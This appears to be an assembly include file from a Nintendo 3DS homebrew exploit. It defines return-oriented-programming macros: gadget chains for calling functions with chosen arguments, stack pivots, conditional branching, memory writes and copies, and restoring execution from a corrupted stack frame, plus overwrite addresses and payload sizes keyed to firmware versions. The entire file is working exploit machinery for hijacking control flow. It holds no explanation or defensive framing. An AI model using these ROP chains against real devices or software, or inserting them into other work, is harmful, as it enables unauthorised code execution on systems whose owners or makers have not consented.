#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12-0x14

#define ROP_BXR1 POP_R4LR_BXR1+4
#define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"

#if NEW3DS==0
	#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
#else
	#define NSS_PROCLOADTEXT_LINEARMEMADR ((0x3d900000-0x400000)+0x21b000)//In SKATER, overwrite the code which gets called for assert/svcBreak when allocating the main heap fails.
#endif

#ifndef LOADSDPAYLOAD
	#define CODEBINPAYLOAD_SIZE (codedataend-codedatastart)
#else
	#if NEW3DS==0
		#define CODEBINPAYLOAD_SIZE 0x4000
	#else
		#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
			#define CODEBINPAYLOAD_SIZE 0x4000
		#else
			#define CODEBINPAYLOAD_SIZE 0x6000
		#endif
	#endif
#endif

#define NEWTHREAD_ROPBUFFER 0x0ff00000

#define MAINLR_SVCEXITPROCESS 0x00100020 //LR of main(), svcExitProcess.

.macro ROP_SETLR lr
.word POP_R1PC
.word ROP_POPPC @ r1

.word POP_R4LR_BXR1
.word 0 @ r4
.word \lr
.endm

.macro ROP_SETLR_OTHER lr
.word POP_R2R6PC
.word ROP_POPPC @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word POP_R4R8LR_BXR2
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word \lr
.endm

.macro CALLFUNC funcadr, r0, r1, r2, r3, sp0, sp4, sp8, sp12
ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word \r0

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr

.word \sp0
.word \sp4
.word \sp8
.word \sp12
.word 0 @ r6
.endm

@ This is basically: CALLFUNC funcadr, *r0, r1, r2, r3, sp0, sp4, sp8, sp12
.macro CALLFUNC_LOADR0 funcadr, r0, r1, r2, r3, sp0, sp4, sp8, sp12
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word \r0

.word ROP_LDR_R0FROMR0

ROP_SETLR POP_R2R6PC

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr

.word \sp0
.word \sp4
.word \sp8
.word \sp12
.word 0 @ r6
.endm

@ This is basically: CALLFUNC funcadr, r0, *r1, r2, r3, sp0, sp4, sp8, sp12
.macro CALLFUNC_LDRR1 funcadr, r0, r1, r2, r3, sp0, sp4, sp8, sp12
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word HEAPBUF + ((. + 0x1c + 0x14) - _start)

.word POP_R1PC
.word \r1

.word ROP_LDRR1R1_STRR1R0

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word \r0

.word POP_R1PC
.word 0 @ Overwritten by the above rop.

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr

.word \sp0
.word \sp4
.word \sp8
.word \sp12
.word 0 @ r6
.endm

.macro CALLFUNC_NOSP funcadr, r0, r1, r2, r3
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word \r0

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr
.endm

@ This is is basically: CALLFUNC_NOSP funcadr, *r0, r1, r2, r3
.macro CALLFUNC_NOSP_LDRR0 funcadr, r0, r1, r2, r3
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word \r0

.word ROP_LDR_R0FROMR0

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr
.endm

@ This is is basically: CALLFUNC_NOSP funcadr, r0, r1, *r2, r3
.macro CALLFUNC_NOSP_LOADR2 funcadr, r0, r1, r2, r3
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word HEAPBUF + ((. + 0x24) - _start)

.word POP_R1PC
.word \r2

.word ROP_LDRR1R1_STRR1R0

.word POP_R0PC
.word \r0

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr
.endm

.macro CALLFUNC_NOARGS funcadr
ROP_SETLR ROP_POPPC
.word \funcadr
.endm

.macro CALL_GXCMD4 srcadr, dstadr, cpysize
CALLFUNC GXLOW_CMD4, \srcadr, \dstadr, \cpysize, 0, 0, 0, 0, 0x8
.endm

@ This is basically: CALL_GXCMD4 *srcadr, dstadr, cpysize
.macro CALL_GXCMD4_LDRSRC srcadr, dstadr, cpysize
CALLFUNC_LOADR0 GXLOW_CMD4, \srcadr, \dstadr, \cpysize, 0, 0, 0, 0, 0x8
.endm

.macro ROPMACRO_STACKPIVOT sp, pc
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word \sp @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word \pc @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0
.endm

.macro ROPMACRO_STACKPIVOT_NEWTHREAD sp, pc
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart) @ r0

.word POP_R1PC
.word \sp @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart) @ r0

.word POP_R1PC
.word \pc @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ r0

.word ROP_LOADR4_FROMOBJR0
.endm

.macro PREPARE_RET2MENUCODE
@ Write the original value for r4, to the location used for loading r4 from on stack @ RET2MENU.
ROPMACRO_COPYWORD TARGETOVERWRITE_STACKADR, (ORIGINALOBJPTR_BASELOADADR+8)
.endm

.macro RET2MENUCODE
PREPARE_RET2MENUCODE

ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4FPPC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
.endm

.macro COND_THROWFATALERR
.word ROP_COND_THROWFATALERR

.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.endm

.macro ROPMACRO_CMPDATA cmpaddr, cmpword, stackaddr_cmpmismatch, stackaddr_cmpmatch
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word HEAPBUF + ((. + 0x14) - _start) @ r0

.word POP_R1PC
.word \cmpaddr @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *cmpaddr to ROPMACRO_CMPDATA_cmpword.

.word POP_R0PC
//ROPMACRO_CMPDATA_cmpword:
.word 0 @ r0

.word POP_R1PC
.word \cmpword @ r1

.word ROP_CMPR0R1

.word HEAPBUF + ((object+0x20) - _start) @ r4

.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word \stackaddr_cmpmismatch @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the value at cmpaddr matches cmpword, continue the ROP, otherwise do the above stack-pivot.

.word 0, 0, 0 @ r4..r6

.if \stackaddr_cmpmatch
ROPMACRO_STACKPIVOT \stackaddr_cmpmatch, ROP_POPPC
.endif
.endm

.macro ROPMACRO_CMPDATA_NEWTHREAD cmpaddr, cmpword, stackaddr_cmpmismatch
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + ((. + 0x14) - newthread_ropstart) @ r0

.word POP_R1PC
.word \cmpaddr @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *cmpaddr to ROPMACRO_CMPDATA_cmpword.

.word POP_R0PC
//ROPMACRO_CMPDATA_cmpword:
.word 0 @ r0

.word POP_R1PC
.word \cmpword @ r1

.word ROP_CMPR0R1

.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object+0x20) - newthread_ropstart) @ r4

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart) @ r0

.word POP_R1PC
.word \stackaddr_cmpmismatch @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the value at cmpaddr matches cmpword, continue the ROP, otherwise do the above stack-pivot.

.word 0, 0, 0 @ r4..r6
.endm

.macro ROPMACRO_WRITEWORD addr, value
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word \addr @ r0

.word POP_R1PC
.word \value @ r1

.word ROP_STR_R1TOR0
.endm

.macro ROPMACRO_COPYWORD dstaddr, srcaddr
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word \dstaddr @ r0

.word POP_R1PC
.word \srcaddr @ r1

.word ROP_LDRR1R1_STRR1R0
.endm

.macro ROPMACRO_LDDRR0_ADDR1_STRADDR dstaddr, srcaddr, value
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word \srcaddr

.word ROP_LDR_R0FROMR0

.word POP_R1PC
.word \value @ r1

.word ROP_ADDR0_TO_R1 @ r0 = *srcaddr + value

.word POP_R1PC
.word \dstaddr

.word ROP_STR_R0TOR1 @ Write the above r0 value to *dstaddr.
.endm

